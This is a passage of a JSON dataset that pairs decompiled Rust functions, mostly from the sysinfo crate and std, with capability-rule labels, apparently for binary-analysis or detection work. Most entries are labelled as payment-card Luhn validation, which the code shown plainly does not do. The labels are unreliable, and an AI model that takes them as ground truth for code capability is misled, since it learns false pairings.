        "decompiled_code": "\nvoid sym.sysinfo::windows::processor::Processor::new_with_values::hae24314455fd2f6f\n               (int64_t arg1, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_stack_00000028;\n    ulong in_stack_00000030;\n    \n    // sysinfo::windows::processor::Processor::new_with_values::hae24314455fd2f6f\n    sym.alloc::slice::__impl_alloc::borrow::ToOwned_for__T__::to_owned::h10d48900a91d7ead(arg1, arg2, arg3);\n    *(arg1 + 0x58) = *(arg4 + 4);\n    uVar1 = arg4[1];\n    uVar2 = arg4[2];\n    uVar3 = arg4[3];\n    *(arg1 + 0x48) = *arg4;\n    *(arg1 + 0x4c) = uVar1;\n    *(arg1 + 0x50) = uVar2;\n    *(arg1 + 0x54) = uVar3;\n    uVar1 = in_stack_00000028[1];\n    uVar2 = in_stack_00000028[2];\n    uVar3 = in_stack_00000028[3];\n    *(arg1 + 0x60) = *in_stack_00000028;\n    *(arg1 + 100) = uVar1;\n    *(arg1 + 0x68) = uVar2;\n    *(arg1 + 0x6c) = uVar3;\n    *(arg1 + 0x70) = *(in_stack_00000028 + 4);\n    *(arg1 + 0x80) = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x78) = in_stack_00000030;\n    return;\n}\n",
        "token_count": 439
    },
    "ec455001": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._std::collections::hash::map::RandomState_as_core::default::Default_::default::hec455001f2d5f2fc(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auStack8 [8];\n    \n    // <std::collections::hash::map::RandomState as core::default::Default>::default::hec455001f2d5f2fc\n    piVar2 = dbg.__getit(0);\n    if (piVar2 != NULL) {\n        iVar1 = *piVar2;\n        *piVar2 = iVar1 + 1;\n        return iVar1;\n    }\n    dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                      , 0x46, auStack8, 0x445c10);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 238
    },
    "b08886f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid sym._sysinfo::windows::network::Networks_as_sysinfo::traits::NetworksExt_::refresh::hb08886f124f0ebed(int64_t arg1)\n\n{\n    uchar auVar1 [16];\n    ulong uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar (*pauVar5) [16];\n    uchar (*pauVar6) [16];\n    uchar (*pauStack1416) [16];\n    uchar (*pauStack1408) [16];\n    uchar *puStack1400;\n    uint16_t uStack1392;\n    ulong uStack1384;\n    ulong uStack1376;\n    uint uStack1368;\n    ulong uStack168;\n    int64_t iStack160;\n    int64_t iStack152;\n    ulong uStack136;\n    ulong uStack96;\n    int64_t iStack88;\n    int64_t iStack80;\n    ulong uStack64;\n    \n    // <sysinfo::windows::network::Networks as sysinfo::traits::NetworksExt>::refresh::hb08886f124f0ebed\n    pauStack1416 = *(arg1 + 0x18);\n    puStack1400 = *pauStack1416 + *(arg1 + 0x10) + 1;\n    auVar1 = *pauStack1416;\n    uStack1392 = ~(SUB161(auVar1 >> 7, 0) & 1 | (SUB161(auVar1 >> 0xf, 0) & 1) << 1 |\n                   (SUB161(auVar1 >> 0x17, 0) & 1) << 2 | (SUB161(auVar1 >> 0x1f, 0) & 1) << 3 |\n                   (SUB161(auVar1 >> 0x27, 0) & 1) << 4 | (SUB161(auVar1 >> 0x2f, 0) & 1) << 5 |\n                   (SUB161(auVar1 >> 0x37, 0) & 1) << 6 | (SUB161(auVar1 >> 0x3f, 0) & 1) << 7 |\n                   (SUB161(auVar1 >> 0x47, 0) & 1) << 8 | (SUB161(auVar1 >> 0x4f, 0) & 1) << 9 |\n                   (SUB161(auVar1 >> 0x57, 0) & 1) << 10 | (SUB161(auVar1 >> 0x5f, 0) & 1) << 0xb |\n                   (SUB161(auVar1 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar1 >> 0x6f, 0) & 1) << 0xd |\n                   (SUB161(auVar1 >> 0x77, 0) & 1) << 0xe | SUB161(auVar1 >> 0x7f, 0) << 0xf);\n    uStack1384 = *(arg1 + 0x28);\n    pauStack1408 = pauStack1416[1];\n    pauVar6 = pauStack1408;\n    while( true ) {\n        pauVar5 = pauVar6;\n        iVar4 = sym._hashbrown::map::IterMut_K_V__as_core::iter::traits::iterator::Iterator_::next::h3e18597bf5935f55\n                          (&pauStack1416);\n        if (iVar4 == 0) break;\n        uStack1376 = **pauVar5;\n        uStack1368 = 0;\n        pauVar6 = pauVar5;\n        iVar3 = sub.IPHLPAPI.DLL_GetIfEntry2(&uStack1376);\n        if (iVar3 == 0) {\n            uVar2 = *(pauVar5[1] + 8);\n            *pauVar5[1] = *(*pauVar5 + 8);\n            *(*pauVar5 + 8) = uStack96;\n            *pauVar5[2] = uVar2;\n            *(pauVar5[1] + 8) = uStack168;\n            *pauVar5[3] = *(pauVar5[2] + 8);\n            *(pauVar5[2] + 8) = iStack152 + iStack160;\n            *pauVar5[4] = *(pauVar5[3] + 8);\n            *(pauVar5[3] + 8) = iStack80 + iStack88;\n            *pauVar5[5] = *(pauVar5[4] + 8);\n            *(pauVar5[4] + 8) = uStack136;\n            *pauVar5[6] = *(pauVar5[5] + 8);\n            *(pauVar5[5] + 8) = uStack64;\n        }\n    }\n    return;\n}\n",
        "token_count": 1128
    },
    "eda9abf2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::traits::SystemExt::refresh_disks::heda9abf213da9071(int64_t arg1)\n\n{\n    int64_t lpDirectoryName;\n    int64_t iVar1;\n    \n    // sysinfo::traits::SystemExt::refresh_disks::heda9abf213da9071\n    lpDirectoryName = *(arg1 + 0x108);\n    for (iVar1 = *(arg1 + 0x118) * 0x88; iVar1 != 0; iVar1 = iVar1 + -0x88) {\n        sym._sysinfo::windows::disk::Disk_as_sysinfo::traits::DiskExt_::refresh::hf1c3e4ca5a17830b(lpDirectoryName);\n        lpDirectoryName = lpDirectoryName + 0x88;\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "9d924784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::new::h9d9247846222b171(ulong *arg1)\n\n{\n    // sysinfo::windows::component::Connection::new::h9d9247846222b171\n    sub.ole32.dll_CoInitializeEx(0, 0);\n    *arg1 = 0;\n    arg1[2] = 0;\n    arg1[4] = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "9d5df667": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::initialize_security::h9d5df667c471c1f0(ulong *arg1, ulong *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    int32_t iVar12;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    \n    // sysinfo::windows::component::Connection::initialize_security::h9d5df667c471c1f0\n    uStack40 = 0;\n    uStack48 = 3;\n    iVar12 = sub.ole32.dll_CoInitializeSecurity(0, 0xffffffff, 0, 0, 0);\n    if (-1 < iVar12) {\n        uVar1 = *arg2;\n        uVar2 = *(arg2 + 4);\n        uVar3 = *(arg2 + 1);\n        uVar4 = *(arg2 + 0xc);\n        uVar5 = *(arg2 + 2);\n        uVar6 = *(arg2 + 0x14);\n        uVar7 = *(arg2 + 3);\n        uVar8 = *(arg2 + 0x1c);\n        uVar9 = *(arg2 + 0x24);\n        uVar10 = *(arg2 + 5);\n        uVar11 = *(arg2 + 0x2c);\n        *(arg1 + 4) = *(arg2 + 4);\n        *(arg1 + 0x24) = uVar9;\n        *(arg1 + 5) = uVar10;\n        *(arg1 + 0x2c) = uVar11;\n        *(arg1 + 2) = uVar5;\n        *(arg1 + 0x14) = uVar6;\n        *(arg1 + 3) = uVar7;\n        *(arg1 + 0x1c) = uVar8;\n        *arg1 = uVar1;\n        *(arg1 + 4) = uVar2;\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xc) = uVar4;\n        return;\n    }\n    *arg1 = 2;\n    uStack48 = *(arg2 + 4);\n    uStack44 = *(arg2 + 0x24);\n    uStack40 = arg2[5];\n    arg2[4] = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n              (&uStack48);\n    uStack48 = *(arg2 + 2);\n    uStack44 = *(arg2 + 0x14);\n    uStack40 = arg2[3];\n    arg2[2] = 0;\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (&uStack48);\n    uStack48 = *arg2;\n    uStack44 = *(arg2 + 4);\n    uStack40 = arg2[1];\n    *arg2 = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n              (&uStack48);\n    sub.ole32.dll_CoUninitialize();\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af(arg2);\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (arg2 + 2);\n    if ((arg2[4] != 0) && (arg2[5] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e85d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg2[5] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 973
    },
    "50bb849b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool sym.sysinfo::windows::processor::Query::get::h50bb849b2cd78639(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStack16 [16];\n    \n    // sysinfo::windows::processor::Query::get::h50bb849b2cd78639\n    iVar1 = sym.hashbrown::map::HashMap_K_V_S_A_::get_inner::haccc908f1bb6c564(arg1 + 0x10, arg2);\n    if (iVar1 != 0) {\n        sub.pdh.dll_PdhGetFormattedCounterValue(*(iVar1 + 0x18), 0x200, 0, auStack16);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 167
    },
    "661b0706": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t sym._T_as_core::fmt::Display_::fmt::h661b0706051ca33a(uint8_t **arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    unkbyte7 Var11;\n    uint8_t *puVar12;\n    uint8_t *arg1_00;\n    uint8_t *arg2_00;\n    int16_t iVar13;\n    int64_t iVar20;\n    uint8_t uVar26;\n    char cVar29;\n    char cVar30;\n    char cVar31;\n    uchar auVar27 [16];\n    uchar auVar28 [16];\n    uchar auVar32 [16];\n    uchar auVar33 [16];\n    unkuint3 Var14;\n    uint32_t uVar15;\n    unkuint5 Var16;\n    unkuint6 Var17;\n    unkuint7 Var18;\n    uint64_t uVar19;\n    unkbyte9 Var21;\n    unkbyte10 Var22;\n    uchar auVar23 [11];\n    uchar auVar24 [12];\n    uchar auVar25 [13];\n    \n    // <&T as core::fmt::Display>::fmt::h661b0706051ca33a\n    arg1_00 = *arg1;\n    arg2_00 = arg1[1];\n    if ((*arg2 != 1) && (arg2[2] != 1)) goto code_r0x004073e4;\n    if (arg2[2] == 1) {\n        puVar6 = NULL;\n        puVar12 = arg1_00;\n        for (iVar8 = arg2[3]; iVar8 != 0; iVar8 = iVar8 + -1) {\n            if (puVar12 == arg1_00 + arg2_00) goto code_r0x00407211;\n            uVar26 = *puVar12;\n            if (uVar26 < '\\0') {\n                if (uVar26 < 0xe0) {\n                    puVar7 = puVar12 + 2;\n                }\n                else if (uVar26 < 0xf0) {\n                    puVar7 = puVar12 + 3;\n                }\n                else {\n                    if ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc |\n                        (uVar26 & 7) << 0x12) == 0x110000) goto code_r0x00407211;\n                    puVar7 = puVar12 + 4;\n                }\n            }\n            else {\n                puVar7 = puVar12 + 1;\n            }\n            puVar6 = puVar7 + (puVar6 - puVar12);\n            puVar12 = puVar7;\n        }\n        if ((puVar12 != arg1_00 + arg2_00) &&\n           ((((uVar26 = *puVar12,  -1 < uVar26 || (uVar26 < 0xe0)) || (uVar26 < 0xf0)) ||\n            ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc | (uVar26 & 7) << 0x12) !=\n             0x110000)))) {\n            puVar12 = arg1_00;\n            if (puVar6 == NULL) {\n                puVar7 = NULL;\n            }\n            else if (puVar6 < arg2_00) {\n                puVar7 = puVar6;\n                if (arg1_00[puVar6] < -0x40) {\ncode_r0x00407204:\n                    puVar7 = puVar6;\n                    puVar12 = NULL;\n                }\n            }\n            else {\n                puVar7 = arg2_00;\n                if (puVar6 != arg2_00) goto code_r0x00407204;\n            }\n            if (puVar12 != NULL) {\n                arg1_00 = puVar12;\n                arg2_00 = puVar7;\n            }\n        }\n    }\ncode_r0x00407211:\n    if (*arg2 == 0) goto code_r0x004073e4;\n    uVar5 = arg2[1];\n    if (arg2_00 < 0x20) {\n        if (arg2_00 == NULL) {\n            uVar4 = 0;\n        }\n        else {\n            if (arg2_00 == 0x1) {\n                uVar4 = 0;\n                puVar12 = arg1_00;\n            }\n            else {\n                puVar12 = arg2_00 & 0xfffffffffffffffe;\n                uVar4 = (puVar12 + -2 >> 1) + 1;\n                uVar9 = uVar4 & 3;\n                if (puVar12 + -2 < 0x6) {\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                }\n                else {\n                    uVar4 = uVar4 & 0xfffffffffffffffc;\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar27 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 2));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 2) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 4));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 4) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar33 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 6));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 6) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar32 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        iVar20 = SUB168(auVar32, 0) +\n                                 SUB168(auVar33, 0) + SUB168(auVar28, 0) + SUB168(auVar27, 0) + iVar20;\n                        iVar10 = SUB168(auVar32 >> 0x40, 0) +\n                                 SUB168(auVar33 >> 0x40, 0) + SUB168(auVar28 >> 0x40, 0) +\n                                 SUB168(auVar27 >> 0x40, 0) + iVar10;\n                        iVar8 = iVar8 + 8;\n                        uVar4 = uVar4 - 4;\n                    } while (uVar4 != 0);\n                }\n                if (uVar9 != 0) {\n                    iVar3 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar3 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar3 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar4 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar4);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar4))\n                                                            >> 0x40, 0), (uVar4 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        iVar20 = iVar20 + SUB168(auVar28, 0);\n                        iVar10 = iVar10 + SUB168(auVar28 >> 0x40, 0);\n                        iVar3 = iVar3 + 2;\n                    } while (uVar9 * 2 != iVar3);\n                }\n                uVar4 = iVar10 + iVar20;\n                if (arg2_00 == puVar12) goto code_r0x004073c7;\n                puVar12 = puVar12 + arg1_00;\n            }\n            do {\n                uVar26 = *puVar12;\n                puVar12 = puVar12 + 1;\n                uVar4 = uVar4 + (-0x41 < uVar26);\n            } while (puVar12 != arg1_00 + arg2_00);\n        }\n    }\n    else {\n        uVar4 = dbg.do_count_chars(arg1_00, arg2_00);\n    }\ncode_r0x004073c7:\n    uVar9 = uVar5 - uVar4;\n    if (uVar4 <= uVar5 && uVar9 != 0) {\n        cVar2 = *(arg2 + 7);\n        if (cVar2 == '\\x03') {\n            cVar2 = '\\0';\n        }\n        if (cVar2 == '\\0') {\n            uVar5 = 0;\n        }\n        else if (cVar2 == '\\x01') {\n            uVar5 = uVar9;\n            uVar9 = 0;\n        }\n        else {\n            uVar5 = uVar9 >> 1;\n            uVar9 = uVar9 + 1 >> 1;\n        }\n        iVar8 = arg2[4];\n        iVar20 = arg2[5];\n        iVar1 = *(arg2 + 0x34);\n        iVar10 = uVar5 + 1;\n        do {\n            iVar10 = iVar10 + -1;\n            Var11 = iVar10 >> 